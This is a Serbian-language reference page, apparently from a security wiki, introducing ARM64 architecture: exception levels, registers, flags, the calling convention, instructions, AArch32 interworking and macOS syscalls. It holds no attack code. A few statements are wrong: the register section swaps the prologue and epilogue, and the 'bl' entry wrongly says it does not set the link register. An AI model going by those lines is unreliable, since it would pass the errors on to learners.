# Uvod u ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Nivoi izuzetaka - EL (ARM64v8)**

U ARMv8 arhitekturi, nivoi izvršavanja, poznati kao Exception Levels (EL), definišu nivo privilegija i mogućnosti izvršnog okruženja. Postoje četiri nivoa izuzetaka, od EL0 do EL3, od kojih svaki služi različitoj svrsi:

1. **EL0 - Korisnički režim**:
- Ovo je najmanje privilegovani nivo i koristi se za izvršavanje uobičajenog kôda aplikacija.
- Aplikacije koje rade na EL0 su izolovane jedna od druge i od sistemskog softvera, što poboljšava sigurnost i stabilnost.
2. **EL1 - Kernel režim operativnog sistema**:
- Većina kernel-a operativnih sistema radi na ovom nivou.
- EL1 ima veće privilegije od EL0 i može pristupiti sistemskim resursima, ali sa određenim ograničenjima radi očuvanja integriteta sistema. Prelaz sa EL0 na EL1 se postiže instrukcijom SVC.
3. **EL2 - Hypervisor režim**:
- Ovaj nivo se koristi za virtualizaciju. Hypervisor koji radi na EL2 može upravljati višestrukim operativnim sistemima (svaki u svom EL1) koji rade na istom fizičkom hardveru.
- EL2 obezbeđuje funkcije za izolaciju i kontrolu virtualizovanih okruženja.
- Dakle, virtualne mašine kao Parallels mogu koristiti `hypervisor.framework` da komuniciraju sa EL2 i pokreću virtuelne mašine bez potrebe za kernel ekstenzijama.
- Za prelaz sa EL1 na EL2 koristi se instrukcija `HVC`.
4. **EL3 - Secure Monitor režim**:
- Ovo je najprivilegovaniji nivo i često se koristi za secure boot i poverljiva izvršna okruženja.
- EL3 može upravljati i kontrolisati pristupe između secure i non-secure stanja (npr. secure boot, trusted OS, itd.).
- Nekada se koristio za KPP (Kernel Patch Protection) u macOS-u, ali se više ne koristi.
- EL3 više ne koristi Apple.
- Prelaz na EL3 obično se vrši korišćenjem instrukcije `SMC` (Secure Monitor Call).

Korišćenje ovih nivoa omogućava strukturiran i siguran način upravljanja različitim aspektima sistema, od korisničkih aplikacija do najprivilegovanijeg sistemskog softvera. ARMv8 pristup nivoima privilegija pomaže u efikasnoj izolaciji različitih komponenti sistema, čime se poboljšava sigurnost i robusnost sistema.

## **Registri (ARM64v8)**

ARM64 ima **31 registra opšte namene**, označena `x0` do `x30`. Svaki može čuvati **64-bitnu** (8-bajt) vrednost. Za operacije koje zahtevaju samo 32-bitne vrednosti, isti registri se mogu pristupiti u 32-bitnom obliku koristeći nazive `w0` kroz `w30`.

1. **`x0`** do **`x7`** - Obično se koriste kao privremeni registri i za prosleđivanje parametara podrutine.
- **`x0`** takođe nosi povratne podatke funkcije.
2. **`x8`** - U Linux kernelu, `x8` se koristi kao broj sistemskog poziva za instrukciju `svc`. **U macOS-u se koristi x16!**
3. **`x9`** do **`x15`** - Više privremenih registara, često korišćenih za lokalne promenljive.
4. **`x16`** i **`x17`** - **Intra-procedural Call Registers**. Privremeni registri za neposredne vrednosti. Takođe se koriste za indirektne pozive funkcija i PLT stubove.
- **`x16`** se koristi kao broj sistemskog poziva za instrukciju `svc` u **macOS**.
5. **`x18`** - **Platform register**. Može se koristiti kao registar opšte namene, ali na nekim platformama ovaj registar je rezervisan za specifične platformske upotrebe: pokazivač na trenutno thread environment block u Windows-u, ili kao pokazivač na trenutno **izvršavajuću task strukturu u linux kernelu**.
6. **`x19`** do **`x28`** - Ovo su callee-saved registri. Funkcija mora sačuvati vrednosti ovih registara za svog pozivaoca, pa se oni skladište na steku i vraćaju pre povratka pozivaocu.
7. **`x29`** - **Frame pointer** za praćenje stack frame-a. Kada se kreira novi stack frame zbog poziva funkcije, registar **`x29`** se **smešta na stek** i nova adresa frame pointer-a (adresa `sp`) se **smesta u ovaj registar**.
- Ovaj registar se takođe može koristiti kao registar opšte namene, iako se obično koristi kao referenca za **lokalne promenljive**.
8. **`x30`** ili **`lr`** - **Link register**. Drži **adresu povratka** kada se izvrši instrukcija `BL` (Branch with Link) ili `BLR` (Branch with Link to Register) tako što čuva vrednost `pc` u ovom registru.
- Može se takođe koristiti kao bilo koji drugi registar.
- Ako trenutna funkcija treba da pozove novu funkciju i samim tim prepiše `lr`, ona će ga na početku smestiti na stek, to je epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) i vratiti ga na kraju, to je prolog (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, koristi se za praćenje vrha steka.
- vrednost **`sp`** uvek treba da bude najmanje poravnata na **quadword** ili može doći do izuzetka poravnanja.
10. **`pc`** - **Program counter**, koji pokazuje na narednu instrukciju. Ovaj registar se može ažurirati samo kroz generisanje izuzetaka, povrate iz izuzetaka i grane. Jedine obične instrukcije koje mogu čitati ovaj registar su branch with link instrukcije (BL, BLR) koje skladište adresu **`pc`** u **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Takođe se zove **`wzr`** u svojoj **32**-bitnoj formi. Može se koristiti da se lako dobije vrednost nula (uobičajena operacija) ili da se obave poređenja koristeći **`subs`** kao **`subs XZR, Xn, #10`** pri čemu se rezultat nigde ne skladišti (u **`xzr`**).

Registri **`Wn`** su **32-bitna** verzija **`Xn`** registra.

> [!TIP]
> Registri od X0 do X18 su volatilni, što znači da njihove vrednosti mogu biti promenjene pozivima funkcija i prekidima. Međutim, registri od X19 do X28 su nevolatilni, što znači da njihove vrednosti moraju biti očuvane preko poziva funkcija ("callee saved").

### SIMD i registri za floating-point

Pored toga, postoji još **32 registra dužine 128 bitova** koji mogu biti korišćeni u optimizovanim single instruction multiple data (SIMD) operacijama i za izvođenje floating-point aritmetike. Oni se zovu Vn registri mada mogu raditi i u **64**-bitnom, **32**-bitnom, **16**-bitnom i **8**-bitnom načinu i tada se nazivaju **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### Sistemski registri

**Postoje stotine sistemskih registara**, takođe zvanih special-purpose registri (SPRs), koji se koriste za **nadzor** i **kontrolu** ponašanja procesora.\
Oni se mogu čitati ili postavljati samo korišćenjem posvećenih posebnih instrukcija **`mrs`** i **`msr`**.

Posebni registri **`TPIDR_EL0`** i **`TPIDDR_EL0`** se često pojavljuju prilikom reverse engineering-a. Sufiks `EL0` ukazuje na **minimalni nivo izuzetka** od kojeg se registar može pristupiti (u ovom slučaju EL0 je regularni nivo privilegija na kojem programi obično rade).\
Često se koriste za čuvanje **osnovne adrese thread-local storage** regiona memorije. Obično je prvi čitljiv i zapisiv za programe koji rade u EL0, dok se drugi može čitati iz EL0 i pisati iz EL1 (kao kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** sadrži nekoliko komponenti procesa serijalizovanih u operativnom-sistemu-vidljivom **`SPSR_ELx`** specijalnom registru, pri čemu X označava **nivo privilegija** pokrenutog izuzetka (ovo omogućava povraćaj stanja procesa kada izuzetak završi).\
Ovo su dostupna polja:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Kondicione zastavice **`N`**, **`Z`**, **`C`** i **`V`**:
- **`N`** znači da je operacija dala negativan rezultat
- **`Z`** znači da je operacija dala nulu
- **`C`** znači da je došlo do prenošenja (carry)
- **`V`** znači da je operacija dala signed overflow:
- Sabiranje dva pozitivna broja daje negativan rezultat.
- Sabiranje dva negativna broja daje pozitivan rezultat.
- Pri oduzimanju, kada se veliki negativan broj oduzme od manjeg pozitivnog broja (ili obrnuto), i rezultat ne može biti predstavljen u okviru zadatog opsega bitova.
- Naravno procesor ne zna da li je operacija signed ili ne, zato će proveriti C i V pri operacijama i označiti da li je došlo do carry u slučaju da je bila signed ili unsigned operacija.

> [!WARNING]
> Neće sve instrukcije ažurirati ove zastavice. Neke kao **`CMP`** ili **`TST`** to rade, a druge koje imaju sufiks s kao **`ADDS`** takođe to rade.

- Trenutna **širina registra (`nRW`)** zastavica: Ako zastavica drži vrednost 0, program će raditi u AArch64 execution state kada se ponovo nastavi.
- Trenutni **Exception Level** (**`EL`**): Regularni program koji radi u EL0 imaće vrednost 0
- Zastavica **single stepping** (**`SS`**): Koriste je debageri za single step tako što postave SS zastavicu na 1 unutar **`SPSR_ELx`** kroz izuzetak. Program će izvesti jedan korak i generisati single step izuzetak.
- Zastavica stanja **illegal exception** (**`IL`**): Koristi se za označavanje kada privilegovani softver izvrši nevažeći transfer nivoa izuzetka, ova zastavica se postavlja na 1 i procesor pokreće illegal state exception.
- **`DAIF`** zastavice: Ove zastavice omogućavaju privilegorisanom programu da selektivno maskira određene spoljne izuzetke.
- Ako je **`A`** 1 to znači da će biti pokrenuti **asynchronous aborts**. **`I`** konfiguriše odgovor na spoljne hardverske **Interrupt Requests** (IRQ). a **F** se odnosi na **Fast Interrupt Requests** (FIR).
- Zastavice za izbor stack pointer-a (**`SPS`**): Privilegorisani programi koji rade u EL1 i iznad mogu menjati između korišćenja svog sopstvenog registra stack pointer-a i user-mode registra (npr. između `SP_EL1` i `EL0`). Ovo menjanje se vrši pisanjem u specijalni registar **`SPSel`**. Ovo se ne može uraditi iz EL0.

## **Calling Convention (ARM64v8)**

ARM64 calling convention specificira da se **prvih osam parametara** funkcije prosleđuje u registrima **`x0` do `x7`**. **Dodatni** parametri se prosleđuju na **steka**. **Vraćena** vrednost se vraća u registru **`x0`**, ili i u **`x1`** ako je dužina 128 bita. Registri **`x19`** do **`x30`** i **`sp`** moraju biti **sačuvani** preko poziva funkcija.

Kada čitate funkciju u asembleru, tražite **prolog i epilog** funkcije. **Prolog** obično uključuje **smeštanje frame pointer-a (`x29`)**, **podešavanje** novog frame pointer-a i **alokaciju prostora na steku**. **Epilog** obično uključuje **vraćanje sačuvanog frame pointer-a** i **povratak** iz funkcije.

### Calling Convention u Swift

Swift ima sopstveni **calling convention** koji se može naći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Uobičajene instrukcije (ARM64v8)**

ARM64 instrukcije generalno imaju **format `opcode dst, src1, src2`**, gde je **`opcode`** operacija koja će se izvršiti (kao `add`, `sub`, `mov`, itd.), **`dst`** je registar destinacija gde će rezultat biti sačuvan, a **`src1`** i **`src2`** su registri izvora. U izvorno mesto mogu se koristiti i neposredne vrednosti.

- **`mov`**: **Prebaci** vrednost iz jednog **registra** u drugi.
- Primer: `mov x0, x1` — Ovo premesta vrednost iz `x1` u `x0`.
- **`ldr`**: **Učitaj** vrednost iz **memorije** u **registar**.
- Primer: `ldr x0, [x1]` — Ovo učitava vrednost iz memorijske lokacije na koju pokazuje `x1` u `x0`.
- **Offset mode**: Offset koji utiče na origin pointer je naznačen, na primer:
- `ldr x2, [x1, #8]`, ovo će učitati u x2 vrednost sa x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, ovo će učitati u x2 objekat iz niza x0, sa pozicije x1 (indeks) * 4
- **Pre-indexed mode**: Ovo će primeniti proračune na origin, dobiti rezultat i takođe sačuvati novi origin u origin.
- `ldr x2, [x1, #8]!`, ovo će učitati `x1 + 8` u `x2` i smestiti u x1 rezultat `x1 + 8`
- `str lr, [sp, #-4]!`, Store the link register in sp and update the register sp
- **Post-index mode**: Ovo je kao prethodno ali memorijska adresa se prvo koristi, pa se zatim offset izračuna i sačuva.
- `ldr x0, [x1], #8`, učitaj `x1` u `x0` i ažuriraj x1 sa `x1 + 8`
- **PC-relative addressing**: U ovom slučaju adresa za učitavanje se izračunava relativno u odnosu na PC registar
- `ldr x1, =_start`, Ovo će učitati adresu gde simbol `_start` počinje u x1 u odnosu na trenutni PC.
- **`str`**: **Snimanje** vrednosti iz **registra** u **memoriju**.
- Primer: `str x0, [x1]` — Ovo snima vrednost iz `x0` u memorijsku lokaciju koju pokazuje `x1`.
- **`ldp`**: **Load Pair of Registers**. Ova instrukcija **učitava dva registra** iz **uzastopnih memorijskih** lokacija. Memorijska adresa se obično formira dodavanjem offset-a vrednosti iz nekog drugog registra.
- Primer: `ldp x0, x1, [x2]` — Ovo učitava `x0` i `x1` iz memorijskih lokacija na `x2` i `x2 + 8`, respektivno.
- **`stp`**: **Store Pair of Registers**. Ova instrukcija **snima dva registra** u **uzastopne memorijske** lokacije. Memorijska adresa se obično formira dodavanjem offset-a vrednosti iz nekog drugog registra.
- Primer: `stp x0, x1, [sp]` — Ovo snima `x0` i `x1` u memorijske lokacije na `sp` i `sp + 8`, respektivno.
- `stp x0, x1, [sp, #16]!` — Ovo snima `x0` i `x1` u memorijske lokacije na `sp+16` i `sp + 24`, respektivno, i ažurira `sp` sa `sp+16`.
- **`add`**: **Saberi** vrednosti dva registra i smesti rezultat u registar.
- Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (registar ili immediate)
- \[shift #N | RRX] -> Izvrši shift ili pozovi RRX
- Primer: `add x0, x1, x2` — Ovo sabira vrednosti u `x1` i `x2` i smešta rezultat u `x0`.
- `add x5, x5, #1, lsl #12` — Ovo je jednako 4096 (1 shiftovan 12 puta) -> 1 0000 0000 0000 0000
- **`adds`**: Izvršava `add` i ažurira zastavice
- **`sub`**: **Oduzmi** vrednosti dva registra i smesti rezultat u registar.
- Pogledajte **`add`** **sintaksu**.
- Primer: `sub x0, x1, x2` — Ovo oduzima vrednost u `x2` od `x1` i smešta rezultat u `x0`.
- **`subs`**: Kao `sub` ali ažurira zastavice
- **`mul`**: **Množi** vrednosti **dva registra** i smesti rezultat u registar.
- Primer: `mul x0, x1, x2` — Ovo množi vrednosti u `x1` i `x2` i smešta rezultat u `x0`.
- **`div`**: **Deli** vrednost jednog registra sa drugim i smesti rezultat u registar.
- Primer: `div x0, x1, x2` — Ovo deli vrednost u `x1` sa `x2` i smešta rezultat u `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Dodavanje 0-ica sa kraja pomeranjem ostalih bitova napred (množenje sa 2^n)
- **Logical shift right**: Dodavanje 0-ica na početku pomeranjem ostalih bitova nazad (deljenje sa 2^n za unsigned)
- **Arithmetic shift right**: Kao **`lsr`**, ali umesto dodavanja 0-ica ako je najznačajniji bit 1, dodaju se 1-ice (deljenje sa 2^n za signed)
- **Rotate right**: Kao **`lsr`** ali to što se ukloni sa desne strane se doda na levo
- **Rotate Right with Extend**: Kao **`ror`**, ali sa carry zastavicom kao "najznačajnijim bitom". Dakle carry zastavica se pomera na bit 31, a uklonjeni bit ide u carry zastavicu.
- **`bfm`**: **Bit Field Move**, ove operacije **kopiraju bitove `0...n`** iz vrednosti i postavljaju ih na pozicije **`m..m+n`**. **`#s`** specificira poziciju **levog** bita, a **`#r`** količinu rotacije udesno.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopira bitfield iz registra i umeće ga u drugi registar.
- **`BFI X1, X2, #3, #4`** Umeće 4 bita iz X2 počevši od 3. bita u X1
- **`BFXIL X1, X2, #3, #4`** Ekstrahuje iz 3. bita X2 četiri bita i kopira ih u X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extend-uje 4 bita iz X2 i umeće ih u X1 počevši od pozicije bita 3, nulujući desne bite
- **`SBFX X1, X2, #3, #4`** Ekstrahuje 4 bita počevši od bita 3 iz X2, sign-extend-uje ih i smešta rezultat u X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extend-uje 4 bita iz X2 i umeće ih u X1 počevši od pozicije bita 3, nulujući desne bite
- **`UBFX X1, X2, #3, #4`** Ekstrahuje 4 bita počevši od bita 3 iz X2 i smešta zero-extend-ovani rezultat u X1.
- **Sign Extend To X:** Produžava znak (ili dodaje samo 0-ice u unsigned verziji) vrednosti da bi se mogle izvršavati operacije:
- **`SXTB X1, W2`** Produžava znak bajta **iz W2 u X1** (`W2` je polovina `X2`) da popuni 64 bita
- **`SXTH X1, W2`** Produžava znak 16-bitnog broja **iz W2 u X1** da popuni 64 bita
- **`SXTW X1, W2`** Produžava znak reči **iz W2 u X1** da popuni 64 bita
- **`UXTB X1, W2`** Dodaje 0-ice (unsigned) bajtu **iz W2 u X1** da popuni 64 bita
- **`extr`:** Ekstrahuje bitove iz specificiranog **para registara konkateniranih**.
- Primer: `EXTR W3, W2, W1, #3` Ovo će **konkatenirati W1+W2** i uzeti **od bita 3 W2 do bita 3 W1** i smestiti u W3.
- **`cmp`**: **Poredi** dva registra i postavlja kondicione zastavice. To je **alias `subs`** postavljajući destinacioni registar na zero registar. Korisno da se proveri da li je `m == n`.
- Podržava istu sintaksu kao `subs`
- Primer: `cmp x0, x1` — Ovo poredi vrednosti u `x0` i `x1` i postavlja kondicione zastavice u skladu sa tim.
- **`cmn`**: **Compare negative** operand. U ovom slučaju to je **alias `adds`** i podržava istu sintaksu. Korisno da se proveri da li je `m == -n`.
- **`ccmp`**: Uslovno poređenje, poređenje koje će se izvršiti samo ako je prethodno poređenje bilo tačno i specifično će postaviti nzcv bitove.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ako x1 != x2 i x3 < x4, skok na func
- Ovo je zato što će se **`ccmp`** izvršiti samo ako je prethodni `cmp` bio `NE`, ako nije, bitovi `nzcv` će biti postavljeni na 0 (što neće zadovoljiti `blt` poređenje).
- Ovo se takođe može koristiti kao `ccmn` (isto ali negativno, kao `cmp` vs `cmn`).
- **`tst`**: Proverava da li su neki od bitova u poređenju oba 1 (radi kao ANDS bez skladištenja rezultata bilo gde). Korisno za proveru registra sa vrednošću i proveru da li je bilo koji od bitova registra označen u vrednosti 1.
- Primer: `tst X1, #7` Proveri da li je bilo koji od poslednja 3 bita X1 postavljen na 1
- **`teq`**: XOR operacija odbacujući rezultat
- **`b`**: Bezuslovni branch
- Primer: `b myFunction`
- Napomena: ovo neće popuniti link register adresom povratka (nije pogodno za pozive podrutina koje treba da se vrate)
- **`bl`**: **Branch** sa linkom, koristi se za **pozivanje** **podrutine**. Skladišti **adresu povratka u `x30`**.
- Primer: `bl myFunction` — Ovo poziva funkciju `myFunction` i skladišti adresu povratka u `x30`.
- Napomena: ovo neće popuniti link register adresom povratka (nije pogodno za pozive podrutina koje treba da se vrate)
- **`blr`**: **Branch** sa linkom na registar, koristi se za **pozivanje** **podrutine** gde je cilj specificiran u **registru**. Skladišti adresu povratka u `x30`.
- Primer: `blr x1` — Ovo poziva funkciju čija adresa je u `x1` i skladišti adresu povratka u `x30`.
- **`ret`**: **Povratak** iz podrutine, obično koristeći adresu u **`x30`**.
- Primer: `ret` — Ovo se vraća iz trenutne podrutine koristeći adresu povratka u `x30`.
- **`b.<cond>`**: Uslovni skokovi
- **`b.eq`**: **Skok ako jednako**, zasnovano na prethodnoj instrukciji `cmp`.
- Primer: `b.eq label` — Ako je prethodni `cmp` našao dve jednake vrednosti, ovo skace na `label`.
- **`b.ne`**: **Skok ako nisu jednaki**. Ova instrukcija proverava kondicione zastavice (koje su postavljene prethodnim poređenjem), i ako upoređene vrednosti nisu jednake, skace na labelu ili adresu.
- Primer: Nakon `cmp x0, x1` instrukcije, `b.ne label` — Ako vrednosti u `x0` i `x1` nisu jednake, skace na `label`.
- **`cbz`**: **Compare and Branch on Zero**. Ova instrukcija poredi registar sa nulom, i ako su jednaki, skace na labelu ili adresu.
- Primer: `cbz x0, label` — Ako je vrednost u `x0` nula, skace na `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Ova instrukcija poredi registar sa nulom, i ako nisu jednaki, skace na labelu ili adresu.
- Primer: `cbnz x0, label` — Ako je vrednost u `x0` nenulta, skace na `label`.
- **`tbnz`**: Testuj bit i skoci ako nije nula
- Primer: `tbnz x0, #8, label`
- **`tbz`**: Testuj bit i skoci ako je nula
- Primer: `tbz x0, #8, label`
- **Uslovne selekcione operacije**: Operacije čije se ponašanje menja zavisno od kondicionih bitova.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ako je tačno, X0 = X1, ako nije, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ako je tačno, Xd = Xn + 1, ako nije, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ako je tačno, Xd = NOT(Xn), ako nije, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ako je tačno, Xd = - Xn, ako nije, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ako je tačno, Xd = 1, ako nije, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ako je tačno, Xd = \<all 1>, ako nije, Xd = 0
- **`adrp`**: Izračunaj **page adresu simbola** i smesti je u registar.
- Primer: `adrp x0, symbol` — Ovo izračunava page adresu `symbol` i smešta je u `x0`.
- **`ldrsw`**: **Učitaj** potpisanu **32-bitnu** vrednost iz memorije i **sign-extend-uj je na 64** bita. Koristi se za uobičajene SWITCH slučajeve.
- Primer: `ldrsw x0, [x1]` — Ovo učitava potpisanu 32-bitnu vrednost iz memorijske lokacije na koju pokazuje `x1`, sign-extend-uje je na 64 bita i smešta u `x0`.
- **`stur`**: **Snimanje vrednosti registra u memorijsku lokaciju**, koristeći offset iz drugog registra.
- Primer: `stur x0, [x1, #4]` — Ovo snima vrednost iz `x0` u memorijsku adresu koja je 4 bajta veća od adrese u `x1`.
- **`svc`** : Napravi **system call**. Stoji za "Supervisor Call". Kada procesor izvrši ovu instrukciju, on **prebacuje iz korisničkog režima u kernel režim** i skače na specifičnu lokaciju u memoriji gde se nalazi **kernel-ov kod za rukovanje system call-ovima**.

- Primer:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Sačuvaj link register i frame pointer na steku**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Podesi novi pokazivač okvira**: `mov x29, sp` (podešava novi pokazivač okvira za trenutnu funkciju)
3. **Alociraj prostor na steku za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj potrebnih bajtova)

### **Epilog funkcije**

1. **Dealociraj lokalne promenljive (ako su bile alocirane)**: `add sp, sp, <size>`
2. **Vrati link registar i pokazivač okvira**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (vraća kontrolu pozivaocu koristeći adresu u link registru)

## ARM uobičajene zaštite memorije

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 stanje izvršavanja

Armv8-A podržava izvršavanje 32-bitnih programa. **AArch32** može da radi u jednom od **dva seta instrukcija**: **`A32`** i **`T32`** i može da se prebacuje između njih preko **`interworking`**.\
**Privileged** 64-bitni programi mogu da pokrenu izvršavanje 32-bitnih programa izvršenjem transfera nivoa izuzetka (exception level) na niže privilegovani 32-bitni kontekst.\
Napomena da prelaz sa 64-bitnog na 32-bitni događa se pri nižem nivou exception level-a (na primer 64-bitni program u EL1 pokreće program u EL0). To se radi postavljanjem **bita 4** specijalnog registra **`SPSR_ELx`** **na 1** kada je `AArch32` procesni thread spreman za izvršavanje, a ostatak `SPSR_ELx` čuva CPSR programa `AArch32`. Zatim privilegovani proces poziva instrukciju **`ERET`** tako da procesor prelazi u **`AArch32`**, ulazeći u A32 ili T32 u zavisnosti od CPSR**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. Ovo u suštini znači postavljanje **najnižeg bita na 1** da bi se označilo da je skup instrukcija T32.\
Ovo se postavlja tokom **interworking branch instructions,** ali se može postaviti i direktno drugim instrukcijama kada je PC postavljen kao destinacioni registar. Primer:

Još jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Postoji 16 32-bit registara (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim neki su obično rezervisani:

- **`r15`**: Program counter (uvek). Sadrži adresu naredne instrukcije. U A32 current + 8, u T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Napomena: stack je uvek poravnan na 16 bajtova)
- **`r14`**: Link Register

Pored toga, registri se čuvaju u **`banked registries`**. To su mesta koja skladište vrednosti registara omogućavajući **brzo prebacivanje konteksta** pri rukovanju izuzecima i privilegovanim operacijama kako bi se izbegla potreba za ručnim čuvanjem i vraćanjem registara svaki put.\
Ovo se radi **čuvanjem stanja procesora iz `CPSR` u `SPSR`** moda procesora u koji je izuzetak prebačen. Pri povratku iz izuzetka, **`CPSR`** se vraća iz **`SPSR`**.

### CPSR - registar trenutnog stanja programa

U AArch32, CPSR radi slično kao **`PSTATE`** u AArch64 i takođe se čuva u **`SPSR_ELx`** kada se desi izuzetak kako bi se kasnije obnovilo izvršavanje:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u nekoliko grupa:

- Application Program Status Register (APSR): Aritmetičke zastavice i dostupan iz EL0
- Execution State Registers: Ponašanje procesa (upravlja OS).

#### Application Program Status Register (APSR)

- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (isto kao u AArch64)
- Zastavica **`Q`**: Postavlja se na 1 kad god se tokom izvršavanja specijalizovane saturirajuće aritmetičke instrukcije dogodi **integer saturation**. Kada je postavljena na **`1`**, ostaje takva dok se ručno ne postavi na 0. Pored toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost — mora se čitati manuelno.
- **`GE`** (Greater than or equal) zastavice: Koriste se u SIMD (Single Instruction, Multiple Data) operacijama, poput "parallel add" i "parallel subtract". Ove operacije omogućavaju obradu više podataka u jednoj instrukciji.

Na primer, **`UADD8`** instrukcija **sabira četiri para bajtova** (iz dva 32-bit operanda) paralelno i smešta rezultate u 32-bit registar. Zatim **postavlja `GE` zastavice u `APSR`** na osnovu tih rezultata. Svaka GE zastavica odgovara jednom od sabiranja bajtova, ukazujući da li je sabiranje za taj par bajtova **prelilo** (overflowed).

Instrukcija **`SEL`** koristi ove GE zastavice za izvođenje uslovnih operacija.

#### Execution State Registers

- Bitovi **`J`** i **`T`**: **`J`** bi trebalo da bude 0, a ako je **`T`** 0 koristi se instrukcijski skup A32, a ako je 1, koristi se T32.
- IT Block State Register (`ITSTATE`): To su bitovi 10-15 i 25-26. Čuvaju uslove za instrukcije unutar grupe prefiksirane **`IT`**.
- Bit **`E`**: Označava **endianness**.
- Mode and Exception Mask Bits (0-4): Određuju trenutno stanje izvršavanja. Peti bit ukazuje da li program radi kao 32bit (vrednost 1) ili 64bit (vrednost 0). Ostala četiri bita predstavljaju **mod izuzetka koji je trenutno u upotrebi** (kada se desi izuzetak i obrađuje). Postavljena vrednost **označava trenutni prioritet** u slučaju da se pokrene drugi izuzetak dok se ovaj obrađuje.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Određeni izuzeci se mogu onemogućiti pomoću bitova **`A`**, `I`, `F`. Ako je **`A`** 1 to znači da će biti pokrenuti **asynchronous aborts**. **`I`** konfiguriše odgovor na spoljne hardverske **Interrupt Requests** (IRQs), a `F` je vezan za **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ili pokrenite `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls će imati **x16 > 0**.

### Mach Traps

Pogledajte u [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` i u [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototipove. Maksimalan broj Mach traps je `MACH_TRAP_TABLE_COUNT` = 128. Mach traps će imati **x16 < 0**, pa morate pozivati brojeve iz prethodne liste sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete pogledati **`libsystem_kernel.dylib`** u disassembleru da biste pronašli kako pozvati ove (i BSD) syscale:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Sometimes it's easier to check the **decompiled** code from **`libsystem_kernel.dylib`** **than** checking the **source code** because the code of several syscalls (BSD and Mach) are generated via scripts (check comments in the source code) while in the dylib you can find what is being called.

### machdep calls

XNU podržava drugi tip poziva nazvan machine dependent. Brojevi tih poziva zavise od arhitekture i ni pozivi ni brojevi nisu garantovani da ostanu konstantni.

### comm page

Ovo je kernel-owned memory page koja je mapirana u adresni prostor svakog korisničkog procesa. Namenjena je da ubrza prelaz iz user mode u kernel space za kernel servise koji se toliko često koriste da bi taj prelaz preko syscalls bio veoma neefikasan.

